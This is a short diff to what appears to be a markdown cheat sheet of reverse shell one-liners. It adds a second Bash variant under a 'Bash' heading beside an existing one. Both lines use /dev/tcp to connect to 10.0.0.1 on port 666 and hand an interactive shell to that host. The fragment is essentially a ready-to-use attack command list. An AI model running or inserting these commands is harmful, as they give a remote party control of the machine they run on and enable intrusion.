@@ -9,9 +9,17 @@ You can find them all around the internet. I couldn't find them all in one place
 
 **Bash**
 
+
 ```
 bash -i >& /dev/tcp/10.0.0.1/666 0>&1
+```   
+
+_or_    
+
 ```
+0<&196;exec 196<>/dev/tcp/10.0.0.1/666; sh <&196 >&196 2>&196
+```
+
 _or_    
 
 ```
